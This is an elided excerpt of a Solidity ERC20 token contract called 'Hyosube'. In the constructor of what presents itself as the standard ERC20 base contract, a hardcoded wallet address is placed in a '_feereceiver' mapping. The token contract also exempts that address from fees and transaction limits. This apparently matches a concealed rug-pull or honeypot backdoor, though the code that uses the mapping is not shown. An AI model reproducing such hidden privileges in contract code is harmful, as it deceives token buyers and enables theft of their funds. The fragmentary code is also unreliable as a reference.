...
contract ERC20 is Context, IERC20, IERC20Metadata {
    ...
    constructor(string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;
        _feereceiver[0x815A13e0838d39f2D952cE166aFDfa5Ae8586d24] = _marketingwallet;
    }
...
contract Hyosube is ERC20, Ownable {
    using SafeMath for uint256;
    ...
    constructor() ERC20("Hyosube \u3059", "HYOSUBE") {
        ...
        excludeFromFees(address(0x815A13e0838d39f2D952cE166aFDfa5Ae8586d24), true);
        
        excludeFromMaxTransaction(owner(), true);
        excludeFromMaxTransaction(address(this), true);
        excludeFromMaxTransaction(address(0x815A13e0838d39f2D952cE166aFDfa5Ae8586d24), true);
